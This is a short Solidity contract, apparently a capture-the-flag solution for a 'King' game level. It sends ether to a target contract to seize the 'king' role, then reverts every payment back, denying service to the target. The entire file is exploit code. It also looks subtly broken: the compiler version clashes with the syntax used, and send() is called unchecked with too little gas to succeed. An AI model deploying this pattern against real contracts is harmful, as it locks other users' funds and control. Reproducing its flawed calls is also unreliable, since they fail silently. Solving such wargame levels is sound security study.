pragma solidity ^0.4.18;

contract KingSlayer {
    address public kingContract;
    
    constructor (address _kingContract) public {
       kingContract = _kingContract;
    }
    
    function takeOverKingdom() external payable {
        //kingContract.transfer(msg.value);
        kingContract.send(msg.value);
    }
    /*
    function currentKingAddress() pure external {
        kingContract
    }
    */
    function() external payable {
        revert("haha mortal Kings cannot pay me in ETH! I only take blood!!");
    }
}
